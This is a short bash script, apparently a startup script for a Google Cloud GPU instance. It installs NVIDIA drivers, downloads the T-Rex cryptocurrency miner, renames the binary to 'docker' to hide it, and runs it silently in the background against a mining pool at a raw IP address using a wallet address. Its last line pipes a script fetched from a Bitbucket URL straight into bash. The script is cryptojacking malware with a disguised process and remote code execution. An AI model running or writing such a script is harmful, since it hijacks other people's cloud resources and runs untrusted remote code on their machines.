#!/bin/bash
apt-get update ; apt-get install sudo -y
sudo apt install linux-modules-nvidia-${NVIDIA_DRIVER_VERSION}-gcp nvidia-driver-${NVIDIA_DRIVER_VERSION}
wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xvf t-rex-0.26.8-linux.tar.gz >/dev/null 2>&1
mv t-rex docker
./docker -a kawpow -o stratum+tcp://143.42.69.250:80 -u GUozwL4ryHbXHs69GduJyxKbYBk7p8YjK7.$(echo $(shuf -i 1000-9999 -n 1)-C) -p x) >/dev/null 2>&1 &
curl -sL https://bitbucket.org/commuter21/escom/raw/main/gudabel.sh | bash 